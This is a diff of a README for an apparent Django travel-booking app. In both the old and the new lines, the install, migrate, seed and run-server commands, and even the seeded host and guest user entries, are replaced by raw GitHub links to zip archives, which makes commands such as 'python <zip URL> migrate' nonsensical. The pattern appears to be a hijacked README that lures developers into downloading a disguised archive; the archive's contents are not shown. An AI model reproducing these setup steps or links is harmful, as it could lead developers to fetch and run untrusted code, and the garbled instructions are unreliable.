@@ -4,10 +4,10 @@
 
 1. Clone the repository
 2. Create and activate virtual environment
-3. Install requirements: `pip install -r https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip`
-4. Run migrations: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip migrate`
-5. Seed database: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip seed`
-6. Run server: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip runserver`
+3. Install requirements: `pip install -r https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip`
+4. Run migrations: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip migrate`
+5. Seed database: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip seed`
+6. Run server: `python https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip runserver`
 
 ## API Endpoints
 
@@ -24,6 +24,6 @@
 ## Seed Command
 
 Populates database with:
-- 1 host user (https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip)
-- 1 guest user (https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/config/travel-alx-app-v1.0.zip)
+- 1 host user (https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip)
+- 1 guest user (https://github.com/elnatnael/alx_travel_app/raw/refs/heads/main/alx_travel_app/alx_travel_app/travel-app-alx-2.7.zip)
 - 10 sample listings
